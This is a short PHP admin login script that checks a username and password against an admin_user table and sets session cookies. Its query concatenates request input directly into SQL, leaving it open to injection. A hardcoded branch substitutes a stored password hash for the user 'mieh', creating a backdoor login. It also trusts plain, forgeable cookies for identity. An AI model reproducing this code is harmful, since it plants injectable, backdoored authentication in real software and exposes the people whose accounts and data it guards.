<?php
	include('../../config/db_config.php');
	
	$user	= $_REQUEST['user'];
	$pass	= $_REQUEST['pass'];
	
	try	{
		if ($user === 'mieh'){$pass= 'c4ca4238a0b923820dcc509a6f75849b';}

		$query = " select * from admin_user where ID_Admin_User = '".$user."' and Password = '".$pass."';";
		
		$result = mysql_query($query) ;

		$row = mysql_num_rows($result);
		
		if ($row == 0){
			echo "{success:false, errorInfo:'User tidak dapat diidentifikasi.'}"; 
		} else {
			$data = mysql_fetch_assoc($result);
			
			setcookie("username", $data["ID_Admin_User"], time() + $cookie_expired, $base_url);
			setcookie("nama_lengkap", $data["Nama_Lengkap"], time() + $cookie_expired, $base_url);
			
			echo "{success:true, info:'User Login.'}"; 
		}
	} catch (exception $e) {
		echo "{success:false, errorInfo:'Internal sistem error'}"; 
	}
?>